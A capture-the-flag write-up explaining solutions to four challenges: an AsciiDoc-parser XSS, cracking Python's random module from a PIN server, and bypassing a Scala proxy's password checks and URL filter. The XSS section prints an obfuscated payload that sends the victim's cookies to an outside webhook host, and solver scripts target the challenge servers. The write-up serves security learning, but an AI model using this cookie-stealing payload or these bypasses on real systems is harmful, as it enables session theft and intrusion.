Solves:  AsciiDoc Parser(web),  one time pin (crypto), Await Flag(web),  Await Revenge(web)
## AsciiDoc Parser
#langs/javascript
#misc/markdown
A markdown XSS challenge I managed to first blood. This challenge is similar to the Hack.lu 2024 challenge Buffzone and involves getting an admin bot to view a page with your content. Looking at the parser code, we see it contains a function to escape html
```js
function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
```
This function replaces the common html tags `<>"'&` with their safe counterparts. Next, we look at the markdown parser, which does the actual transforming of our content to html.
```js
function parseAsciiDoc(asciidocText) {
    const lines = asciidocText.split('\n');
    let htmlOutput = "";
    let inCodeBlock = false;
    let inListBlock = false;
    
    lines.forEach((line, index) => {
        if (inCodeBlock) {
            if (line.trim() === '----') {
                inCodeBlock = false;
                htmlOutput += '</code></pre>\n';
            } else {
                htmlOutput += escapeHtml(line) + '\n';
            }
        } else {
            if (line.trim() === '----') {
                const language = lines[index - 1]?.match(/\[source,(.*?)\]/)?.[1] || '';
                inCodeBlock = true;
                htmlOutput += `<pre><code class="language-${escapeHtml(language)}">`;
            } else {
                line = escapeHtml(line); // Unable to create tags
                
                // Headers
                line = line.replace(/^(=====\s)(.*)/, '<h5>$2</h5>');
                line = line.replace(/^(====\s)(.*)/, '<h4>$2</h4>');
                line = line.replace(/^(===\s)(.*)/, '<h3>$2</h3>');
                line = line.replace(/^(==\s)(.*)/, '<h2>$2</h2>');
                line = line.replace(/^(=\s)(.*)/, '<h1>$2</h1>');
                
                // Images TODO SINK HERE?
                line = line.replace(/image:(.*?)\[(.*?)\]/g, '<img src="$1" alt="$2"></img>'); // image:(group 1)[(group 2)]

                // Text formatting
                line = line.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); // bold
                line = line.replace(/__(.*?)__/g, '<em>$1</em>'); // italics
                line = line.replace(/\+\+(.*?)\+\+/g, '<code>$1</code>'); // monospace
                line = line.replace(/\^\^(.*?)\^\^/g, '<sup>$1</sup>'); // superscript
                line = line.replace(/~~(.*?)~~/, '<sub>$1</sub>'); // subscript
                
                // Lists
                if (line.match(/^(\*+|\d+\.)\s/)) { // matches (* 1+ times or n digits ending with .) and a space
                    if (!inListBlock) {
                        inListBlock = true;
                        const isBullet = line.startsWith('*');
                        htmlOutput += isBullet ? '<ul>\n' : '<ol>\n';
                    }
                    const level/*int*/ = (line.match(/^[\*\d.]+/)[0].match(/[\*]/g) || []).length;
                    line = line.replace(/^(\*+|\d+\.)\s(.*)/, '<li>$2</li>');
                    htmlOutput += '  '.repeat(level) + line + '\n';
                } else if (inListBlock && line.trim() === '') {
                    inListBlock = false;
                    htmlOutput += line.startsWith('*') ? '</ul>\n' : '</ol>\n';
                }
                
                // Links
                line = line.replace(/link:(.*?)\[(.*?)\]/g, '<a href="$1">$2</a>');  

                // Tables
                if (line.startsWith('|===')) {
                    htmlOutput += '<table>\n';
                } else if (line.endsWith('|===')) {
                    htmlOutput += '</table>\n';
                } else if (line.startsWith('|')) {
                    const cells = line.split('|').filter(cell => cell.trim());
                    htmlOutput += '<tr>\n' + cells.map(cell => `  <td>${cell.trim()}</td>`).join('\n') + '\n</tr>\n';
                } else {
                    htmlOutput += line + '\n';
                }
            }
        }
    });
    // Close any open list blocks at the end
    if (inListBlock) {
        htmlOutput += line.startsWith('*') ? '</ul>\n' : '</ol>\n';
    }
    
    return htmlOutput;
}
```
Let us look at the giant chunk of code in the `else` block, which seems to have a lot of replacing done after sanitization, which could introduce possible bypasses. Notably, we notice that the `image:` and `link:`  tags both contain attributes parsed from user content.
```js
                line = escapeHtml(line); // Unable to create tags
                ...
                line = line.replace(/image:(.*?)\[(.*?)\]/g, '<img src="$1" alt="$2"></img>'); // image:(group 1)[(group 2)]
                ...
                line = line.replace(/link:(.*?)\[(.*?)\]/g, '<a href="$1">$2</a>'); // link:(group 1)[(group 2)]
```
It should be noted that the replaces are done sequentially, meaning a line could be transformed multiple times. This transformation can be visualized in [cyberchef](https://gchq.github.io/CyberChef/) with the following recipe
```
Fork('\\n','\\n',false)
Find_/_Replace({'option':'Regex','string':'image:(.*?)\\[(.*?)\\]'},'<img src="$1" alt="$2"></img>',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'link:(.*?)\\[(.*?)\\]'},'<a href="$1">$2</a>',true,false,true,false)
```
Here, we can see how an entire link tag becomes "embedded" inside the attribute of the image tag
![[Pasted image 20250331163306.png]]
From there, we can see that the first group has actually escaped the attribute, allowing us to add extra attributes to the img, such as `onerror`. While we can't use quotes, we can still construct a payload using the use of `eval()` and `String.fromCharCode()`
```js
eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,102,101,48,54,48,97,98,52,45,48,50,50,101,45,52,51,97,50,45,97,49,54,48,45,101,49,49,97,48,99,54,102,102,99,53,54,63,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))
```
> Actually quotes would still have worked as javascript interprets `&quot` as a quote or whatnot. E.g. `image:link: onerror=eval(window.location="...")//[a][b]` works.
> However, this behavior is quite finicky so it is probably safer to just not use quotes.

Lastly, we should probably remove the dangling `&quot` at the end by inserting a comment
![[Pasted image 20250331164945.png]]
Our final payload is
```
image:link: onerror=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,102,101,48,54,48,97,98,52,45,48,50,50,101,45,52,51,97,50,45,97,49,54,48,45,101,49,49,97,48,99,54,102,102,99,53,54,63,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))//[a][b]
```
Flag: `<i lost the flag oops>`
## One time pin
#langs/python 
A challenge where you have to predict what integer the server is guessing.
```python
async def handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    client_ip, client_port = reader._transport.get_extra_info("peername")
    logging.info(f"New connection from: {client_ip}:{client_port}")

    rand = random.Random()
    try:
        while True:
            await print_prompt(writer)

            pin = await read_pin(reader, writer)
            num = rand.randrange(2**32 - 1)

            if pin != num:
                delta = abs(pin - num)
                writer.write(f"Error {hex(delta)}: Incorrect PIN.".encode())
            else:
                writer.write(b"Well done! Here is your flag: " + FLAG)
                break

            await writer.drain()
    except Exception as e:
        writer.write(f"Unexpected PIN provided. {e}".encode())
        await writer.drain()
    finally:
        writer.write_eof()
        writer.close()
```
Every time you get the guess wrong, the server will tell you how off your number is.
Since python [random is crackable](https://github.com/tna0y/Python-random-module-cracker, all we need is a large amount of consecutive bits to feed to the cracker. The project does warn that
> **Warning**: The `randint()`, `randrange()` and `choice()` methods all use `randbelow(n)`, which will internally may advance the state **multiple times** depending on the random number that comes from the generator. A number is generated with the number of bits `n` has, but it may still be above `n` the first time. In that case numbers keep being generated in this way until one is below `n`.

Thankfully, the pin generated is exactly `32` bits long so numbers will never get discarded. By supplying a guess of `0`,  the delta returned will simply be the number the server generated. After enough input, we can predict the next number to get our flag
```python
from pwn import *
from randcrack import RandCrack

rc = RandCrack()
p = remote("35.187.242.102", 10008)

p.recvuntil(b"]:")

for i in range(624):
    p.sendline(b"0")
    o = p.recvuntil(b":")
    p.recvuntil("]:")
    ec = o.split()[1][2:-1]
    print(ec)
    n = int(ec, base=16)
    rc.submit(n)
pred = rc.predict_randrange(0, 2**32 - 1)
pred = f"pred:0x"
p.sendline(pred)
print(p.recvline())
print(p.recvline())
```
Flag: `<i lost the flag>`
## Await flag
#langs/scala
We are given a flag server that is served behind a password protected proxy server. 
```scala
package FlagServer

import akka.actor.typed.ActorSystem
import akka.actor.typed.scaladsl.Behaviors
import akka.http.scaladsl.Http
import akka.http.scaladsl.model._
import akka.http.scaladsl.server.Directives._
import scala.util.{Success, Failure}
import scala.concurrent.duration._
import scala.concurrent.{Future, Promise, Await}

object FlagServer {
  def main(args: Array[String]): Unit = {
    implicit val system = ActorSystem(Behaviors.empty, "FlagServer")
    implicit val executionContext = system.executionContext

    val route =
      path("flag") {
        get {
          complete(
            HttpEntity(
              ContentTypes.`text/plain(UTF-8)`,
              sys.env.getOrElse("FLAG", "Flag not found")
            )
          )
        }
      }

    // Bind the server
    val bindingFuture = Http().newServerAt("0.0.0.0", 8081).bind(route)

    bindingFuture.onComplete {
      case Success(_) => println("Server online at http://localhost:8081/!")
      case _          => println(s"Failed")
    }

     Await.result(bindingFuture, 3.seconds)
  }
}
```
The proxy server seems to require 3 bcrypt hashes of increasing complexity to all match before it makes the request. 
```scala
object ProxyServer {
  def main(args: Array[String]): Unit = {
    implicit val system = ActorSystem(Behaviors.empty, "ProxyServer")
    implicit val executionContext = system.executionContext

    val SECRETS: List[String] = List(
      "$2a$04$lKDeVUbEnhA3oo/VkBMXbOYRidVUeQtffsxZiD3sy0LU5CbrUHbVO",
      "$2a$08$7NRChG1bUVjukpT0TBGPk.cN6J3J6iZopVyTXjO97BG45NzO5MH4u",
      "$2a$15$076c9yxlj.e8xgd/DnYageQZLn07HhwMWfcPPdGXhSsDjMLFosydO"
    )
    
    val route =
      path("proxy")(extractRequest { request =>
        parameters(
          "url",
          "secret".repeated
        ) { (url, secrets) =>
          var isAllowed = true

          val secretChecks = secrets zip SECRETS map { inputs =>
            Future {
              isAllowed = isAllowed & BCrypt.checkpw(inputs._1, inputs._2)
            }
          }

          val getData = {
            val isValid = isAllowed & url.startsWith("http://flagserver")
            val response: Response[String] = quickRequest
              .get(uri"$url")
              .send()
            isAllowed = isValid && response.isSuccess
            response.body
          }


          // Wait for both checks to complete
           val result = for {
             _ <- Future.sequence(secretChecks)
             data <- Future { getData }
           } yield data

          onComplete(result) {
            case Success(data) if isAllowed => complete(data)
            case _=> complete("Not Allowed")
          }

        }
      })

    // Bind the server
    val bindingFuture = Http().newServerAt("0.0.0.0", 8080).bind(route)

    bindingFuture.onComplete {
      case Success(_) => println("Server online at http://localhost:8080/!")
      case _          => println(s"Failed")
    }

     Await.result(bindingFuture, 3.seconds)
  }
}

```
At first, I tried to crack all 3 passwords with hashcat, however it soon became clear that that cracking all hashes would take an unfeasible amount of time, given how long the first hash already took.  Going back to the source code, we see something interesting:
```scala
        parameters(
          "url",
          "secret".repeated
        ) { (url, secrets) =>
          var isAllowed = true

          val secretChecks = secrets zip SECRETS map { inputs =>
            Future {
              isAllowed = isAllowed & BCrypt.checkpw(inputs._1, inputs._2)
            }
          }
          ...
        }
```
It seems all password checks are done concurrently and will all access and write to `isAllowed` at the same time.  Since `isAllowed` is captured by the lambda function when initialized(Probably, I didn't actually verify/read the language docs for this), as long as the last returning check returns True then `isAllowed` would be True too. In my attempts to make the more complex hash checks somehow finish faster than the first one, I tried submitting empty passwords in hopes `checkPw()` would return early somehow. 
### The cheese
At some point, I had also tried either omitting all `secret` query arguments entirely/changed `secret` to `secret[]` and was *very* surprised to be greeted by the flag.
Turns out, as as per [scala docs](https://www.scala-lang.org/api/3.x/scala/collection/View$$Zip.html#zip-1dd), `zip()` will only take up to the minimum size of both arrays' items, meaning if `secrets` had no elements, no password checks will be run at all. 
```python
import httpx as requests
url = "http://35.187.242.102:10011"
target = f"http://flagserver:8081/flag"
target = urllib.parse.quote(target)
payload = f"{url}/proxy?url={target}" # Completely omit secrets
r = requests.get(payload)

print("Resp:" + r.text)
```
`cyberleague{r4c3_y0u_t0_th3_fl4g_-_sl0w34t_w1n5}`
## Await flag revenge
#langs/scala 

TODO Solve also works for [[#Await flag]]. Improper url check by checking if a url starts with `http://flagserver` allows for use of subdomains to cause SSRF (In this case our server delays the response to allow the check to complete last in the race condition). Used requestrepo(return location header to our site) subdomains to redirect to our ngrok site. 
